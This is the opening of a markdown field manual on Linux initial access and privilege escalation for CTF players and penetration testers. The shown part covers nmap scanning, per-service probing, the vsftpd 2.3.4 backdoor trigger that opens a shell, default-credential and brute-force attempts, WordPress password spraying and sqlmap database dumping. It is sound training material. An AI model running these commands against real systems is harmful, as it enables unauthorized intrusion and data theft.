# 🐧 Linux Privilege Escalation: The Complete Field Manual
### From Zero to Root — A Comprehensive Bible for CTF Players & Penetration Testers

---

> **"The system is only as secure as its weakest configuration."**
>
> **"Enumeration is not a phase — it is a mindset."**
>
> **"Root is not a destination. It is the result of understanding."**

---

## 📖 About This Book

This manual is the **complete, one-stop reference** for Linux privilege escalation and initial access — starting from having nothing (no credentials, no shell, no foothold) all the way to full root compromise. It is structured as a learning journey:

**Phase 1:** You have a target IP. No credentials. No shell. Nothing.
**Phase 2:** You gain initial access through service exploitation, web vulnerabilities, or credential attacks.
**Phase 3:** You escalate from a low-privilege user to root using one of dozens of techniques.
**Phase 4:** You maintain access and understand what you did and why it worked.

This manual is written for:
- CTF (Capture The Flag) players looking to go from zero to root on challenge boxes
- Penetration testers performing authorized assessments against Linux targets
- Security professionals learning offensive techniques to better defend systems
- Students learning ethical hacking from the ground up with no prior experience assumed

**How to use this book:**
- Read sequentially if you are a beginner — the foundations matter enormously
- Jump to specific chapters if you already have a shell and need an escalation vector
- Use Part X as your field reference during active engagements
- Every command is explained — not just shown — so you understand *why* it works

> ⚠️ **LEGAL NOTICE:** Every technique in this book should only be used on systems you own or have explicit written permission to test. Unauthorized access to computer systems is a criminal offence in virtually every jurisdiction. Use this knowledge ethically and legally.

---

## 📚 Interactive Table of Contents

> **HOW TO NAVIGATE:** Every heading below is a clickable link. In any Markdown viewer (Obsidian, GitHub, VS Code Preview, Typora, Joplin) clicking a link jumps directly to that section. Use `Ctrl+F` / `Cmd+F` to search anywhere in the document. Each Part header acts as a bookmark.

---

### 🔴 PART 0 — INITIAL ACCESS (Zero to Foothold)
- [Chapter 0 — The Methodology: From IP to Shell](#chapter-0-the-methodology--from-ip-to-shell)
- [Chapter 0a — Reconnaissance & Service Discovery](#chapter-0a-reconnaissance--service-discovery)
  - [0a.1 What is Reconnaissance?](#0a1-what-is-reconnaissance)
  - [0a.2 Nmap — The Complete Reference](#0a2-nmap--the-complete-reference)
  - [0a.3 Understanding Nmap Output — What To Do With Each Service](#0a3-understanding-nmap-output--what-to-do-with-each-service)
  - [0a.4 Passive Reconnaissance](#0a4-passive-reconnaissance)
- [Chapter 0b — Web Application Initial Access](#chapter-0b-web-application-initial-access)
  - [0b.1 Why Web Apps Are the #1 Entry Point](#0b1-why-web-apps-are-the-1-entry-point)
  - [0b.2 Web Application Enumeration](#0b2-web-application-enumeration)
  - [0b.3 Common Web Vulnerabilities for Initial Access](#0b3-common-web-vulnerabilities-for-initial-access)
    - [SQL Injection to RCE](#0b31-sql-injection-to-rce)
    - [LFI / RFI to Shell](#0b32-local-file-inclusion-lfi-to-shell)
    - [Command Injection](#0b34-command-injection)
    - [File Upload Bypass](#0b35-file-upload-vulnerabilities)
    - [Default Credentials](#0b36-default-credentials)
- [Chapter 0c — Service Exploitation for Initial Access](#chapter-0c-service-exploitation-for-initial-access)
  - [0c.1 FTP Exploitation](#0c1-ftp-exploitation)
  - [0c.2 SMB / Samba Exploitation](#0c2-smb--samba-exploitation)
  - [0c.3 SMTP User Enumeration](#0c3-smtp-user-enumeration)
  - [0c.4 SNMP Information Disclosure](#0c4-snmp-information-disclosure)
- [Chapter 0d — Credential Attacks & Password Spraying](#chapter-0d-credential-attacks--password-spraying)
  - [0d.1 Password Spraying Theory](#0d1-password-spraying-theory)
  - [0d.2 Building Wordlists](#0d2-building-wordlists)
  - [0d.3 Hydra — Complete Reference](#0d3-hydra--complete-reference)
  - [0d.4 What To Do When You Have Credentials](#0d4-what-to-do-when-you-have-credentials)

---

### 🟡 PART I — FOUNDATIONS
- [Chapter 1 — Understanding the Linux Privilege Model](#chapter-1-understanding-the-linux-privilege-model)
  - [1.1 The Linux User & Permission Model](#11-the-linux-user--permission-model)
  - [1.2 How Privilege Escalation Works](#12-how-privilege-escalation-works)
  - [1.3 Linux Authentication Files](#13-linux-authentication-files)
- [Chapter 2 — Enumeration: The Art of Reconnaissance](#chapter-2-enumeration--the-art-of-reconnaissance)
  - [2.1 Why Enumeration is Everything](#21-why-enumeration-is-everything)
  - [2.2 System Information Gathering](#22-system-information-gathering)
  - [2.3 User & Group Enumeration](#23-user--group-enumeration)
  - [2.4 File System Enumeration](#24-file-system-enumeration)
  - [2.5 Automated Enumeration Tools](#25-automated-enumeration-tools)
- [Chapter 3 — Essential Tools & Commands Deep Dive](#chapter-3-essential-tools--commands-deep-dive)
  - [3.1 The find Command — Master Reference](#31-the-find-command--master-reference)
  - [3.2 The grep Command — Master Reference](#32-the-grep-command--master-reference)
  - [3.3 Other Essential Commands](#33-other-essential-commands)

---

### 🟢 PART II — SHELL FUNDAMENTALS
- [Chapter 4 — Getting a Shell: Every Method](#chapter-4-getting-a-shell--every-method)
- [Chapter 5 — Reverse Shells: Every Language & Case](#chapter-5-reverse-shells--every-language--case)
  - [5.1 How a Reverse Shell Works (Theory)](#51-how-a-reverse-shell-works-theory)
  - [5.2 Bash Reverse Shells](#52-bash-reverse-shells)
  - [5.3 Python Reverse Shells](#53-python-reverse-shells)
  - [5.4 PHP Reverse Shells](#54-php-reverse-shells)
  - [5.5 Perl Reverse Shell](#55-perl-reverse-shell)
  - [5.6 Ruby Reverse Shell](#56-ruby-reverse-shell)
  - [5.7 C/C++ Reverse Shell](#57-cc-reverse-shell)
  - [5.8 Netcat Reverse Shells](#58-netcat-reverse-shells)
  - [5.9 Java Reverse Shell](#59-java-reverse-shell)
  - [5.10 Socat Reverse Shell (Best Quality)](#510-socat-reverse-shell-best-quality)
  - [5.11 MSFvenom Payloads](#511-msfvenom-payloads)
- [Chapter 6 — Shell Stabilization & Upgrading](#chapter-6-shell-stabilization--upgrading)
  - [6.2 Python PTY Method](#62-method-1-python-pty-most-common)
  - [6.3 Socat Upgrade](#63-method-2-socat-upgrade-best)
  - [6.7 SSH Upgrade](#67-method-6-ssh-upgrade-best-for-persistence)
- [Chapter 7 — Bind Shells, Web Shells & Named Pipe Shells](#chapter-7-bind-shells-web-shells--named-pipe-shells)

---

### 🔵 PART III — ENVIRONMENT VARIABLES & PATH EXPLOITATION
- [Chapter 8 — Environment Variables: Complete Guide](#chapter-8-environment-variables--complete-guide)
  - [8.2 Critical Env Vars for Privilege Escalation](#82-critical-environment-variables-for-privilege-escalation)
    - [PATH](#821-path)
    - [LD_PRELOAD](#822-ld_preload)
    - [LD_LIBRARY_PATH](#823-ld_library_path)
    - [Other Exploitable Variables (PYTHONPATH, BASH_ENV, PS4...)](#824-other-exploitable-environment-variables)
  - [8.3 Complete Environment Variable Reference](#83-complete-environment-variable-reference)
- [Chapter 9 — PATH Hijacking](#chapter-9-path-hijacking)
- [Chapter 10 — LD_PRELOAD, LD_LIBRARY_PATH Exploitation](#chapter-10-ld_preload-ld_library_path-exploitation)

---

### 🟠 PART IV — FILE PERMISSION EXPLOITATION
- [Chapter 11 — SUID/SGID Binaries: Full Exploitation](#chapter-11-suidsgid-binaries--full-exploitation)
  - [11.2 Finding and Researching SUID Binaries](#112-finding-and-researching-suid-binaries)
  - [11.3 GTFOBins — The SUID Bible](#113-gtfobins--the-suid-bible)
    - [bash/sh](#1131-bash--sh) | [find](#1132-find) | [vim/vi](#1133-vim--vi) | [python](#1134-python--python3) | [perl](#1135-perl) | [ruby](#1136-ruby) | [nmap](#1137-nmap) | [less/more](#1138-less--more) | [nano](#1139-nano) | [cp/mv](#11310-cp--mv) | [chmod](#11311-chmod) | [tar](#11312-tar) | [awk](#11313-awk) | [wget/curl](#11315-wget--curl)
- [Chapter 12 — Capabilities Exploitation](#chapter-12-linux-capabilities)
  - [12.2 Finding Files with Capabilities](#122-finding-files-with-capabilities)
  - [12.3 Exploiting Dangerous Capabilities](#123-exploiting-dangerous-capabilities)
- [Chapter 13 — Writable Files & Cron Jobs](#chapter-13-writable-files--cron-job-exploitation)
- [Chapter 14 — Weak File Permissions](#chapter-14-weak-file-permissions)

---

### 🔴 PART V — SUDO EXPLOITATION
- [Chapter 15 — Sudo Misconfigurations](#chapter-15-sudo-misconfigurations)
  - [15.3 Sudo Exploitation by Binary (GTFOBins)](#153-sudo-exploitation-by-binary)
  - [15.4 The ! Bypass (CVE-2019-14287)](#154-the--bypass-cve-2019-14287)
- [Chapter 16 — Sudo Version Vulnerabilities](#chapter-16-sudo-version-vulnerabilities)
  - [16.1 Baron Samedit (CVE-2021-3156)](#161-baron-samedit-cve-2021-3156)
- [Chapter 17 — Sudoers File: Deep Dive](#chapter-17-sudoers-file--deep-dive)

---

### ⚫ PART VI — KERNEL & OS EXPLOITATION
- [Chapter 18 — Kernel Exploits](#chapter-18-kernel-exploits)
  - [18.4 Dirty COW (CVE-2016-5195)](#184-dirty-cow-cve-2016-5195)
  - [18.5 PwnKit (CVE-2021-4034)](#185-pwnkit-cve-2021-4034)
  - [18.6 DirtyPipe (CVE-2022-0847)](#186-dirtypipe-cve-2022-0847)
- [Chapter 19 — NFS Exploitation](#chapter-19-nfs-exploitation)
  - [19.4 NFS Privilege Escalation — Step by Step](#194-nfs-privilege-escalation--step-by-step)
- [Chapter 20 — Shared Libraries & Dynamic Linker](#chapter-20-shared-libraries--dynamic-linker)

---

### 🟣 PART VII — SERVICE & NETWORK EXPLOITATION
- [Chapter 21 — SSH: Full Pentesting Guide](#chapter-21-ssh--full-pentesting-guide)
  - [21.2 SSH Brute Force](#212-ssh-brute-force)
  - [21.3 SSH Key Attacks](#213-ssh-key-attacks)
  - [21.6 SSH Port Forwarding & Tunneling](#216-ssh-port-forwarding--tunneling)
- [Chapter 22 — Cron Job Exploitation (Advanced)](#chapter-22-cron-job-exploitation-advanced)
- [Chapter 23 — Internal Services Exploitation](#chapter-23-internal-services-exploitation)
- [Chapter 24 — MySQL/PostgreSQL/Redis Exploitation](#chapter-23-internal-services-exploitation)

---

### 🟡 PART VIII — ADVANCED TECHNIQUES
- [Chapter 25 — Container Escapes (Docker/LXC/LXD)](#chapter-25-docker-container-escapes)
  - [25.2 Privileged Container Escape](#252-privileged-container-escape)
  - [25.3 Docker Socket Escape](#253-docker-socket-escape)
  - [25.4 LXC/LXD Container Escape](#254-lxclxd-container-escape)
- [Chapter 26 — Wildcard Injection](#chapter-26-wildcard-injection-advanced)
  - [26.2 tar Wildcard Exploitation](#262-complete-tar-wildcard-exploitation)
- [Chapter 27 — Python/Perl/Ruby Script Exploitation](#chapter-27-python-perl-ruby-script-exploitation)
- [Chapter 28 — /etc/passwd and /etc/shadow Attacks](#chapter-28-etcpasswd-and-etcshadow-attacks--deep-dive)
- [Chapter 29 — Shared Object Hijacking & RPATH](#chapter-29-shared-object-hijacking--rpath)
- [Chapter 30 — Logrotate, Systemd & Timer Exploitation](#chapter-30-logrotate-systemd-timer--service-exploitation)

---

### 🔵 PART IX — NETCAT & PIVOTING
- [Chapter 31 — Netcat: The Complete Guide](#chapter-29-netcat--the-complete-guide)
  - [31.2 Netcat Complete Flag Reference](#292-netcat-complete-flag-reference)
  - [31.3 Netcat File Transfer](#293-netcat-file-transfer)
  - [31.7 Alternatives When nc Is Not Available](#297-alternatives-when-nc-is-not-available)
- [Chapter 32 — Port Forwarding & Tunneling](#chapter-30-port-forwarding--tunneling)
  - [32.1 SSH Local Port Forwarding](#301-ssh-local-port-forwarding)
  - [32.2 SSH Dynamic (SOCKS) Forwarding](#302-ssh-dynamic-socks-forwarding)
  - [32.3 Chisel (Modern Tunneling Tool)](#303-chisel-modern-tunneling-tool)

---

### 🟢 PART X — CHECKLISTS & QUICK REFERENCE
- [Chapter 33 — Credential Hunting: Every Place to Look](#chapter-33-credential-hunting--every-place-to-look)
- [Chapter 34 — Full Enumeration Checklist](#chapter-34-full-enumeration-checklist)
  - [34.1 Phase 1: First 2 Minutes (Immediate Wins)](#341-phase-1-immediate-first-2-minutes)
  - [34.2 Phase 2: Thorough Enumeration](#342-phase-2-thorough-enumeration-next-10-minutes)
  - [34.3 Phase 3: Deep Hunting](#343-phase-3-deep-hunting-remaining-time)
- [Chapter 35 — Command Reference Card](#chapter-35-command-reference-card)
- [Chapter 36 — CTF Methodology Flow & Decision Tree](#chapter-36-ctf-methodology-flow--decision-tree)
- [Chapter 37 — Wordlists, Tools & Resources](#chapter-37-wordlists-tools--complete-resources)

---

### 🔴 PART XI — PRACTICE LABS & LEARNING METHODOLOGY
- [Chapter 38 — How to Actually Learn Privilege Escalation](#chapter-38-how-to-actually-learn-privilege-escalation--the-right-method)
  - [38.2 The Structured Learning Path](#382-the-structured-learning-path-beginner-to-advanced)
  - [38.3 Personal Progress Tracker](#383-your-personal-progress-tracker)
- [Chapter 39 — Universal Machine Methodology](#chapter-39-universal-machine-methodology--step-by-step)
- [Chapter 40 — TryHackMe: Complete Free Room Guide](#chapter-40-tryhackme--complete-free-room-guide)
- [Chapter 41 — HackTheBox: Complete Free Machine Guide](#chapter-41-hackthebox--complete-free-machine-guide)
- [Chapter 42 — VulnHub: Best Free Offline VMs](#chapter-42-vulnhub--best-free-offline-practice-vms)
- [Chapter 43 — The Learning Schedule & IppSec Method](#chapter-43-the-learning-methodology--detailed-answer)

---

### ⚡ BONUS CHAPTERS (What Puts You Ahead)
- [Bonus A — The Mindset Edge: How Top Hackers Think Differently](#bonus-a--the-mindset-edge)
- [Bonus B — Custom Exploit Development Basics](#bonus-b--custom-exploit-development-basics)
- [Bonus C — Stealth & Anti-Forensics Techniques](#bonus-c--stealth--anti-forensics)
- [Bonus D — Automation: Writing Your Own Enumeration Scripts](#bonus-d--automation-writing-your-own-enumeration-scripts)
- [Bonus E — The Unknown Binary: How to Approach Anything](#bonus-e--the-unknown-binary-approach)
- [Bonus F — Real CTF Case Studies & Full Walkthroughs](#bonus-f--real-ctf-case-studies)

---

> 💡 **TIP:** Render this file in **Obsidian** for the best experience — all links are clickable, code blocks are syntax-highlighted, and you can use graph view to see connections between topics. Also works in VS Code with Markdown Preview Enhanced, Typora, or GitHub.

---

---

# PART 0 — INITIAL ACCESS (Starting From Nothing)

---

# Chapter 0: The Methodology — From IP to Shell

## 0.1 The Attacker's Mindset: Zero to Root Philosophy

When you are given only a target IP address, many beginners freeze. They do not know where to start. This chapter gives you the complete mental model and methodology for gaining your first foothold on a system.

The process is **not random**. It follows a repeatable, structured methodology:

```
[IP Address]
     │
     ▼
[Reconnaissance]  ← What services are running? What versions?
     │
     ▼
[Service Analysis] ← For each service: what known vulns? what misconfigs?
     │
     ▼
[Exploit / Attack] ← Gain initial access (shell, file read, RCE)
     │
     ▼
[Post-Exploitation] ← Stabilize, enumerate, escalate
     │
     ▼
[Privilege Escalation] ← Get root using techniques in this book
```

**The golden rule:** You cannot skip steps. Jumping straight to exploitation without proper recon means you will miss the actual vulnerability. Recon is 50% of the work.

## 0.2 Thinking Like an Attacker

Before touching any tool, ask yourself:

```
1. What SERVICES are exposed? Every open port is a potential doorway.
2. What SOFTWARE is running? Every software version has a known vulnerability history.
3. What USERS exist? Every user account is a potential target for credential attacks.
4. What MISCONFIGURATIONS exist? Default credentials, unnecessary services, exposed files.
5. What INFORMATION is publicly visible? Certificates, banners, error messages reveal details.
```

**The mindset of patience:** Real penetration testing and CTFs both reward patience. A vulnerability you miss in 5 minutes of scanning you might catch in 30 minutes of careful analysis. Do not rush.

---

# Chapter 0a: Reconnaissance & Service Discovery

## 0a.1 What is Reconnaissance?

Reconnaissance (recon) is the systematic gathering of information about a target. In Linux pentesting (especially CTF), this primarily means **port scanning** and **service fingerprinting** — finding out what is running and what version it is.

**Why every port matters:**
- Port 22 (SSH) → potential brute force, key reuse, version exploits
- Port 80/443 → web application vulnerabilities (LFI, RFI, SQLi, RCE)
- Port 21 (FTP) → anonymous login, file upload, version exploits
- Port 25/110/143 → mail services, potential user enumeration
- Port 3306 → MySQL exposed externally, credential attacks
- Port 6379 → Redis with no auth (critical misconfiguration)
- Custom ports → always investigate anything unusual

## 0a.2 Nmap — The Complete Reference

Nmap (Network Mapper) is the primary tool for port scanning and service discovery. Understanding it deeply is essential.

```bash
# ============================================================
# NMAP FULL REFERENCE FOR PENTESTING
# ============================================================

# --- BASIC SCANS ---

# Quickest scan — just common ports, no version detection
nmap TARGET_IP

# Scan specific port(s):
nmap -p 22 TARGET_IP              # Single port
nmap -p 22,80,443 TARGET_IP       # Multiple ports
nmap -p 1-1000 TARGET_IP          # Port range
nmap -p- TARGET_IP                # ALL 65535 ports (slow but thorough)
nmap -p- --min-rate 5000 TARGET_IP  # All ports, faster

# --- SERVICE & VERSION DETECTION ---

# Version detection — ESSENTIAL for finding vulnerabilities:
nmap -sV TARGET_IP
# Output: 22/tcp open  ssh  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
#                                   ^--- This is what you search for exploits!

# OS detection (requires root):
sudo nmap -O TARGET_IP

# Aggressive scan (version + scripts + OS + traceroute):
nmap -A TARGET_IP
sudo nmap -A TARGET_IP            # With OS detection

# --- SCAN TYPES ---

# TCP SYN scan (default, requires root, stealthier):
sudo nmap -sS TARGET_IP

# TCP Connect scan (no root needed, noisier):
nmap -sT TARGET_IP

# UDP scan (slow but reveals hidden services):
sudo nmap -sU TARGET_IP
sudo nmap -sU --top-ports 100 TARGET_IP   # Top 100 UDP ports only

# Combined TCP + UDP:
sudo nmap -sS -sU TARGET_IP

# --- SPEED & TIMING ---

# Timing templates (-T0 slowest, -T5 fastest):
nmap -T1 TARGET_IP    # Sneaky (very slow)
nmap -T3 TARGET_IP    # Normal (default)
nmap -T4 TARGET_IP    # Aggressive (fast, for CTFs)
nmap -T5 TARGET_IP    # Insane (may miss ports, drops packets)

# Control rate directly:
nmap --min-rate 1000 TARGET_IP   # Minimum 1000 packets/second
nmap --max-rate 500 TARGET_IP    # Maximum 500 packets/second

# --- NSE SCRIPTS ---
# Nmap Scripting Engine (NSE) extends nmap with powerful scripts

# Run default scripts:
nmap -sC TARGET_IP
# -sC = same as --script=default

# Run ALL scripts matching a category:
nmap --script=vuln TARGET_IP          # Run all vulnerability scripts
nmap --script=auth TARGET_IP          # Authentication scripts
nmap --script=brute TARGET_IP         # Brute force scripts
nmap --script=discovery TARGET_IP     # Discovery scripts
nmap --script=exploit TARGET_IP       # Exploitation scripts (careful!)

# Run specific script:
nmap --script=http-title TARGET_IP             # Get page title
nmap --script=http-enum TARGET_IP              # Web path enumeration
nmap --script=ftp-anon TARGET_IP -p 21        # Check FTP anonymous login
nmap --script=ssh-brute TARGET_IP -p 22       # SSH brute force
nmap --script=mysql-empty-password TARGET_IP  # MySQL no-password check
nmap --script=smb-vuln-ms17-010 TARGET_IP     # EternalBlue check
nmap --script=http-shellshock TARGET_IP       # Shellshock check

# Script with arguments:
nmap --script=http-brute --script-args http-brute.path=/admin TARGET_IP

# --- PRACTICAL CTF WORKFLOW ---

# Step 1: Fast scan to find open ports
nmap -p- --min-rate 5000 -T4 TARGET_IP -oN ports.txt

# Step 2: Detailed scan on found ports only
# (Replace PORT1,PORT2 with output from step 1)
nmap -sV -sC -p PORT1,PORT2,PORT3 TARGET_IP -oN detailed.txt

# Step 3: If web ports found, run web scripts
nmap --script=http-enum,http-title,http-methods -p 80,443,8080 TARGET_IP

# Step 4: UDP if TCP yields nothing
sudo nmap -sU --top-ports 20 TARGET_IP

# --- OUTPUT FORMATS ---
nmap TARGET_IP -oN output.txt        # Normal text output
nmap TARGET_IP -oX output.xml        # XML output
nmap TARGET_IP -oG output.gnmap      # Grepable output
nmap TARGET_IP -oA output            # All three formats simultaneously
# Use -oA output so you always have all formats

# --- READING NMAP OUTPUT ---
# PORT     STATE  SERVICE  VERSION
# 22/tcp   open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
# 80/tcp   open   http     Apache httpd 2.4.29 ((Ubuntu))
# 3306/tcp open   mysql    MySQL 5.7.33-0ubuntu0.18.04.1

# From this output:
# → SSH 7.6p1 Ubuntu → search "OpenSSH 7.6p1 exploit" or check for user enumeration CVE-2018-15473
# → Apache 2.4.29 → search "Apache 2.4.29 CVE"
# → MySQL 5.7.33 → try connecting: mysql -u root -h TARGET_IP (no password)
```

## 0a.3 Understanding Nmap Output — What To Do With Each Service

Once you have your port scan results, you need a systematic approach to each service:

```
METHODOLOGY FOR EACH OPEN PORT:
1. Identify the service and exact version
2. Search: "[Service] [Version] exploit" on Google, SearchSploit, CVEdetails
3. Try default/common credentials
4. Run service-specific enumeration tools
5. Look for configuration weaknesses (anonymous login, no auth, etc.)
6. Check if the service reveals useful information (usernames, paths, etc.)
```

### Service-Specific First Steps:

```bash
# PORT 21 (FTP):
# First try: anonymous login
ftp TARGET_IP
# Username: anonymous
# Password: (anything or empty — try: anonymous, guest, ftp, your@email.com)
# If anonymous works: list files and download everything!
ftp> ls -la
ftp> get filename
ftp> mget *          # Download all files
ftp> lcd /tmp        # Change local download directory
ftp> binary          # Switch to binary mode for non-text files

# Check FTP version for vulnerabilities:
# vsftpd 2.3.4 → famous backdoor! Try connecting:
nc TARGET_IP 21
# Type: USER test:)    ← The :) triggers the backdoor!
# Should open a shell on port 6200:
nc TARGET_IP 6200

# PORT 22 (SSH):
# → Try default credentials (root/root, root/password, admin/admin)
# → If you have usernames, try SSH brute force
# → Check version: ssh -V or grab banner with nc
nc -vn TARGET_IP 22    # Banner reveals version

# PORT 25 (SMTP):
# → User enumeration via VRFY/EXPN commands:
nc TARGET_IP 25
VRFY root              # Does user exist?
VRFY admin
EXPN postmaster        # Expand mailing list
# Or use smtp-user-enum:
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t TARGET_IP

# PORT 80/443 (HTTP/HTTPS):
# → This is usually the richest attack surface. See Chapter 0b.

# PORT 110 (POP3):
nc TARGET_IP 110
USER root
PASS password          # Try credentials

# PORT 111 (RPCbind):
rpcinfo -p TARGET_IP   # List RPC services
showmount -e TARGET_IP  # Show NFS exports (see Chapter 19)

# PORT 139/445 (SMB):
smbclient -L TARGET_IP                   # List shares (no auth)
smbclient -L TARGET_IP -N               # No password
smbclient -L TARGET_IP -U ""           # Explicit empty user
smbclient //TARGET_IP/share -N          # Connect to share
enum4linux -a TARGET_IP                 # Full SMB enumeration
crackmapexec smb TARGET_IP              # Quick SMB info
crackmapexec smb TARGET_IP --shares -u '' -p ''  # Anonymous shares

# PORT 161 (SNMP/UDP):
# SNMP community strings often left at defaults:
snmpwalk -c public -v1 TARGET_IP        # Walk with "public" community
snmpwalk -c private -v1 TARGET_IP       # Try "private"
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt TARGET_IP  # Brute force community

# PORT 389/636 (LDAP):
ldapsearch -h TARGET_IP -x              # Anonymous bind
ldapsearch -h TARGET_IP -x -b "dc=example,dc=com"  # Search base DN
nmap --script=ldap-search TARGET_IP -p 389

# PORT 3306 (MySQL):
mysql -h TARGET_IP -u root              # Try root without password
mysql -h TARGET_IP -u root -proot       # Try root:root
mysql -h TARGET_IP -u admin -padmin

# PORT 5432 (PostgreSQL):
psql -h TARGET_IP -U postgres           # Try default postgres user

# PORT 6379 (Redis):
redis-cli -h TARGET_IP ping             # Should return PONG if no auth

# PORT 27017 (MongoDB):
mongo TARGET_IP                         # Try connecting without auth
mongo TARGET_IP:27017                   # Specify port

# PORT 8080/8443 (Alternative HTTP):
# Treat like port 80/443 but look for admin panels:
curl -v http://TARGET_IP:8080/
# Common admin paths: /manager (Tomcat), /admin, /console, /management
```

## 0a.4 Passive Reconnaissance

Before active scanning, gather information passively (especially for real engagements):

```bash
# WHOIS — domain registration info:
whois TARGET_DOMAIN

# DNS enumeration:
nslookup TARGET_DOMAIN
dig TARGET_DOMAIN ANY                     # All DNS records
dig TARGET_DOMAIN MX                     # Mail servers
dig TARGET_DOMAIN TXT                    # TXT records (SPF, DMARC, internal info)
dig axfr TARGET_DOMAIN @DNS_SERVER       # Zone transfer (if allowed!)
host -t mx TARGET_DOMAIN                 # Mail exchange records

# Subdomain enumeration:
gobuster dns -d TARGET_DOMAIN -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# Or: ffuf -u http://FUZZ.TARGET_DOMAIN -w subdomains.txt
# Or: amass enum -d TARGET_DOMAIN

# Certificate transparency (find subdomains):
# Visit: https://crt.sh/?q=%.TARGET_DOMAIN

# Google dorking:
# site:TARGET_DOMAIN filetype:pdf            ← Find PDF files
# site:TARGET_DOMAIN inurl:admin             ← Find admin pages
# site:TARGET_DOMAIN "password" OR "passwd"  ← Accidental exposure
# intitle:"index of" site:TARGET_DOMAIN      ← Open directories

# Shodan (internet-facing service info):
# https://www.shodan.io/search?query=hostname:TARGET_DOMAIN
# From CLI: shodan search hostname:TARGET_DOMAIN

# Wayback Machine (archived pages):
# https://web.archive.org/web/*/TARGET_DOMAIN/*
# Old pages may show config files, old admin panels, old CVs

# GitHub/GitLab (leaked credentials/code):
# Search: TARGET_DOMAIN password
# Search: TARGET_COMPANY api_key
# Use: truffleHog, gitleaks to search git history for secrets
```

---

# Chapter 0b: Web Application Initial Access

## 0b.1 Why Web Apps Are the #1 Entry Point

Web applications are the single most common source of initial access in both CTFs and real-world penetration tests. This is because:

1. They are **always internet-facing** — that's their purpose
2. They are **incredibly complex** — thousands of lines of code, many attack surfaces
3. They are **often misconfigured** — developers focus on features, not security
4. They run as **system users** — typically www-data, apache, or sometimes root!
5. They **expose the server directly** — a remote code execution (RCE) in a web app = shell on the server

## 0b.2 Web Application Enumeration

The moment you see port 80, 443, 8080, or 8443 — start deep web enumeration.

```bash
# ============================================================
# STEP 1: Initial visit and observation
# ============================================================

# View source code — always do this first!
curl -s http://TARGET_IP/ | head -100
# Look for: comments, version strings, framework hints, hidden paths

# Get HTTP headers — reveal server, framework, version:
curl -I http://TARGET_IP/
# Example output:
# Server: Apache/2.4.29 (Ubuntu)
# X-Powered-By: PHP/7.2.24
# Set-Cookie: PHPSESSID=abc123    ← PHP session, not ASP/Java
# X-Frame-Options: SAMEORIGIN

# Follow redirects verbosely:
curl -L -v http://TARGET_IP/ 2>&1 | head -50

# ============================================================
# STEP 2: Technology fingerprinting
# ============================================================

# whatweb — identifies technologies:
whatweb http://TARGET_IP
whatweb -v http://TARGET_IP      # Verbose
whatweb -a 3 http://TARGET_IP    # Aggressive

# Wappalyzer browser extension (manual but very good)
# Or: retire.js for JS library versions

# Check robots.txt — often lists hidden paths!
curl http://TARGET_IP/robots.txt
# Common entries: /admin, /backup, /private, /secret

# Check sitemap:
curl http://TARGET_IP/sitemap.xml

# ============================================================
# STEP 3: Directory & File Enumeration
# ============================================================

# GOBUSTER — fast, reliable directory brute force:
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# With file extensions (look for backup files, config files, etc.):
gobuster dir -u http://TARGET_IP \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
    -x php,txt,html,bak,old,backup,zip,conf,config,sql,xml,json \
    -t 50

# Flags explained:
# -u URL           → target URL
# -w WORDLIST      → wordlist file
# -x EXTENSIONS    → file extensions to try
# -t THREADS       → number of threads (default 10, use 50-100 for CTF)
# -o OUTPUT        → save output to file
# -s STATUS        → show only specific status codes (e.g., -s 200,301,302)
# --no-error       → hide errors
# -b CODES         → blacklist status codes (e.g., -b 404,403)
# -k               → skip TLS certificate verification

# FFUF — very fast, flexible fuzzer:
ffuf -u http://TARGET_IP/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
ffuf -u http://TARGET_IP/FUZZ -w wordlist.txt -fc 404          # Filter 404s
ffuf -u http://TARGET_IP/FUZZ -w wordlist.txt -mc 200,301,302  # Match only these codes
ffuf -u http://TARGET_IP/FUZZ -w wordlist.txt -fs 1234         # Filter by response size

# Recursive — go into discovered directories:
gobuster dir -u http://TARGET_IP/admin -w wordlist.txt    # Recurse into /admin

# FEROXBUSTER — automatically recursive:
feroxbuster -u http://TARGET_IP -w wordlist.txt --depth 3

# DIRB — classic:
dirb http://TARGET_IP /usr/share/wordlists/dirb/common.txt

# Nikto — vulnerability scanner for web servers:
nikto -h http://TARGET_IP
nikto -h http://TARGET_IP -p 80,443,8080    # Multiple ports
# Nikto checks for: outdated software, dangerous files, misconfigurations

# ============================================================
# STEP 4: CMS Detection & Exploitation
# ============================================================

# WordPress:
wpscan --url http://TARGET_IP
wpscan --url http://TARGET_IP --enumerate u     # Enumerate users
wpscan --url http://TARGET_IP --enumerate p     # Enumerate plugins
wpscan --url http://TARGET_IP --enumerate t     # Enumerate themes
wpscan --url http://TARGET_IP --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# WordPress manual checks:
curl http://TARGET_IP/wp-login.php           # Login page
curl http://TARGET_IP/wp-admin/              # Admin panel
curl http://TARGET_IP/wp-content/            # Content directory
curl http://TARGET_IP/xmlrpc.php             # XML-RPC (brute force vector!)
curl http://TARGET_IP/?author=1              # Enumerate usernames

# Joomla:
joomscan -u http://TARGET_IP
curl http://TARGET_IP/administrator/         # Admin login
curl http://TARGET_IP/configuration.php     # Try to read config

# Drupal:
droopescan scan drupal -u http://TARGET_IP
curl http://TARGET_IP/CHANGELOG.txt         # Reveals version!
curl http://TARGET_IP/user/register         # Registration page

# Magento:
magescan scan:all http://TARGET_IP
```

## 0b.3 Common Web Vulnerabilities for Initial Access

### 0b.3.1 SQL Injection to RCE

SQL injection is not just about reading data — it can lead directly to a shell.

```bash
# Detection:
# Add ' to any input field or URL parameter
# http://TARGET_IP/item?id=1'
# If you see: SQL syntax error → SQLi exists!

# sqlmap — automated SQL injection:
sqlmap -u "http://TARGET_IP/page?id=1" --dbs         # Find databases
sqlmap -u "http://TARGET_IP/page?id=1" -D dbname --tables   # List tables
sqlmap -u "http://TARGET_IP/page?id=1" -D dbname -T users --dump  # Dump data

